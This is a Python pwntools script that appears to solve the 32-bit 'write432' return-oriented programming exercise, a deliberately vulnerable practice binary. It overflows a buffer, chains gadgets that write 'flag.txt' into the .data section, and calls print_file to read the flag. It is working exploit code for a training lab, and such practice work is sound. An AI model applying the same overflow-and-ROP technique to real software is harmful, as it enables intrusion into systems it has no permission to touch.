from pwn import *


# 8 bytes big and writeable
data_section_start = 0x0804a018


# 0x0804839d : pop ebx ; ret
# 0x080485ab : pop ebp ; ret



# 0x080485aa : pop edi ; pop ebp ; ret
pop_values_gadget = 0x080485aa


# 0x08048543 : mov dword ptr [edi], ebp ; ret
move_gadget = 0x08048543


binary = "./write432"

elf = ELF(binary)

print_file_plt = elf.plt["print_file"]
log.info("print_file_plt: " + hex(print_file_plt) + f" {print_file_plt}")

payload = b""
payload += b"A"*(54-8-2)

# WRITE FIRST HALF OF PAYLOAD INTO .DATA
payload += pack(pop_values_gadget, 32)
payload += pack(data_section_start, 32)     # -> edi
payload += b"flag"  # -> ebp
payload += pack(move_gadget, 32)

# WRITE SECOND HALF OF PAYLOAD INTO .DATA
payload += pack(pop_values_gadget, 32)  # -> edi
payload += pack(data_section_start+4, 32)
payload += b".txt"   # -> ebp
payload += pack(move_gadget, 32)


payload += pack(print_file_plt, 32)
payload += b"B"*4   # ret
payload += pack(data_section_start, 32)


write("/tmp/docgil", payload)

p = process([binary])
r = p.recv().decode("utf-8")
log.info(f"r: {r}")

p.send(payload)
flag = p.recvall().decode("utf-8")
log.info(f"flag: {flag}")